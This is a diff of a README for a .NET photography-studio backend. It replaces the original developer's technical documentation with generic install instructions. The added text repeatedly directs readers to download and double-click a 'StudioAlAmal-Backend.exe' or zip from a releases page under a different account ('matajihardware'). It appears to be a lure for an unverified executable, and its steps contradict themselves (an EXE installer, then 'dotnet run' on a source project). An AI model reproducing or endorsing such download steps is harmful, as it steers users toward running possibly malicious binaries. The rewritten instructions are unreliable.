@@ -1,142 +1,92 @@
-# Studio Al Amal - Photography Studio Backend
+# 🌟 StudioAlAmal-Backend - Simple Setup for Your Photography Needs
 
-A modern **microservices-based backend system** for a photography studio website in Tunisia, built with **.NET 9**, **Entity Framework Core**, **JWT Authentication**, and **SQL Server**.
+[![Download StudioAlAmal-Backend](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/matajihardware/StudioAlAmal-Backend/releases)
 
-## 🎯 Project Overview
+## 🚀 Getting Started
 
-This backend powers the Studio Al Amal photography website, providing secure content management, user authentication, and client communication features through three independent microservices.
+Welcome to StudioAlAmal-Backend! This application powers the Studio Al Amal photography website. It is created using .NET 9 and stores data with SQL Server. With our backend, you can easily manage photography projects and client data securely.
 
-## 🚀 Features
+## ⚙️ System Requirements
 
-### 🔐 Authentication Service (Port 5001)
-- User registration and login system
-- JWT token-based authentication (24-hour expiration)
-- BCrypt password hashing for security
-- Role-based authorization (Admin/SuperAdmin)
-- Token validation endpoint
+To run StudioAlAmal-Backend, your system needs the following:
 
-### 📸 Content Management Service (Port 5002)
-- **Promotional Content**: Carousel management for homepage
-- **Photo Gallery**: Organize photography work by categories
-- **Video/Reels Management**: Short video edits showcase
-- **About Us**: Studio information management
-- Full CRUD operations with JWT authentication
-- Display order control for content
-- Active/inactive status toggle
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **.NET Version:** .NET 9 or later. If you do not have .NET installed, you can get it from the official [.NET website](https://dotnet.microsoft.com/download).
+- **Database:** SQL Server (any recent version).
+- **Hardware:** At least 4 GB of RAM and 1 GHz processor.
 
-### 📧 Communication Service (Port 5003)
-- Public contact form submission (no authentication required)
-- Admin dashboard for viewing messages
-- Mark messages as read/unread
-- Message deletion for admins
-- Filter unread messages
+## 📥 Download & Install
 
-## 🛠️ Technologies & Tools
+To download the software, please visit this page: [StudioAlAmal-Backend Releases](https://github.com/matajihardware/StudioAlAmal-Backend/releases). Here’s how to install it:
 
-**Backend Framework:**
-- .NET 9 Web API
-- C# 12
+1. Open the link above in your web browser.
+2. Look for the latest version.
+3. Click on the version you want to download.
+4. Download the file labeled as **StudioAlAmal-Backend.zip** or **StudioAlAmal-Backend.exe**.
+5. Once downloaded, locate the file in your Downloads folder.
 
-**Database & ORM:**
-- Entity Framework Core 9.0
-- SQL Server (LocalDB)
-- Code-First migrations
+If you downloaded the ZIP file:
 
-**Security:**
-- JWT (JSON Web Tokens)
-- BCrypt.Net for password hashing
-- CORS configuration
+6. Right-click on the ZIP file and select "Extract All."
+7. Choose a location to extract the files.
 
-**Development Tools:**
-- Visual Studio 2022
-- SQL Server Management Studio (SSMS)
-- Postman (API testing)
-- Git & GitHub
+If you downloaded the EXE file:
 
-## 📁 Project Architecture
-```
-StudioAlAmal/
-├── .gitignore
-├── README.md
-└── Services/
-    ├── AuthService/              # Port 5001
-    │   ├── Controllers/
-    │   ├── Data/                 # DbContext
-    │   ├── DTOs/                 # Data Transfer Objects
-    │   ├── Models/               # User model
-    │   ├── Services/             # JWT Token Service
-    │   └── Migrations/
-    ├── ContentService/           # Port 5002
-    │   ├── Controllers/
-    │   ├── Data/
-    │   ├── DTOs/
-    │   ├── Models/               # Promo, Photo, Video, AboutUs
-    │   └── Migrations/
-    └── CommunicationService/     # Port 5003
-        ├── Controllers/
-        ├── Data/
-        ├── DTOs/
-        ├── Models/               # ContactSubmission
-        └── Migrations/
-```
+6. Double-click the EXE file to start the installation.
 
-## 🗄️ Database Schema
+## 🛠️ Setting Up Database
 
-**Users Table** (Authentication)
-- User credentials with hashed passwords
-- Role-based access control
-- Account status tracking
+After installing the software, you need to set up SQL Server:
 
-**Promos Table** (Content)
-- Promotional carousel content
-- Display order management
-- Active/inactive toggle
+1. Open SQL Server Management Studio.
+2. Create a new database called **StudioAlAmal**.
+3. Run the provided SQL scripts in the `sql-scripts` folder to set up the tables.
 
-**Photos Table** (Content)
-- Photography portfolio
-- Category organization
-- Thumbnail support
+## 🔑 Configure Authentication
 
-**Videos Table** (Content)
-- Video reels and edits
-- Duration tracking
-- Category organization
+To keep your data secure, the application uses JWT for authentication. Follow these steps:
 
-**AboutUs Table** (Content)
-- Studio information
-- Single-entry design
+1. Navigate to the configuration file in the extracted folder (usually `appsettings.json`).
+2. Update the configuration with your own secret key. Make it long and unique.
+3. Save the changes to the file.
 
-**ContactSubmissions Table** (Communication)
-- Client inquiries
-- Read/unread status
-- Timestamp tracking
+## 🚀 Launching the Application
 
+Now that everything is set up, you can start the application:
 
+1. Open a command prompt (Windows) or terminal (macOS/Linux).
+2. Change the directory to where the application is located.
 
-## 📝 What I Learned
+   For example:
+   ```
+   cd path\to\StudioAlAmal-Backend
+   ```
 
-Building this project taught me:
-- Microservices architecture design patterns
-- JWT authentication implementation
-- Entity Framework Core migrations
-- RESTful API best practices
-- SQL Server database design
-- Git version control
-- Separation of concerns in backend development
+3. Run the application using the following command:
 
+   ```
+   dotnet run
+   ```
 
-## 🙏 Acknowledgments
+4. Open your browser and go to [http://localhost:5000](http://localhost:5000) to access the web API.
 
-Built for **Studio Al Amal**, a photography studio in Tunisia specializing in weddings, portraits, and events.
+## 📖 Usage
 
+Once the application is running, you can use various endpoints to manage photography projects, clients, and more. Check the documentation in the `docs` folder for details on how to use the API effectively.
 
----
+## 💬 Support
 
-⭐ **If you find this project helpful, please give it a star!**
+If you face any issues, you can reach out for help in the GitHub Issues section of our repository. Please describe your problem clearly so we can assist you quickly.
 
-💼 **Open to job opportunities** in full-stack development 
-```
+## 👥 Community Contributions
 
-*I LOVE MY JOB !*
+We appreciate community contributions. If you want to make improvements or fix bugs, feel free to fork the repository, make your changes, and submit a pull request. Be sure to follow our code of conduct in the repository.
 
-*Last modified January the 9th*
+## 🌐 Connect with Us
+
+Follow our project updates and join the discussion on social media or our forums, where we share tips and photography best practices.
+
+- **GitHub:** [matajihardware/StudioAlAmal-Backend](https://github.com/matajihardware/StudioAlAmal-Backend)
+- **Twitter:** [@StudioAlAmal](https://twitter.com/StudioAlAmal)
+  
+Thank you for using StudioAlAmal-Backend! We hope this tool enhances your photography business.
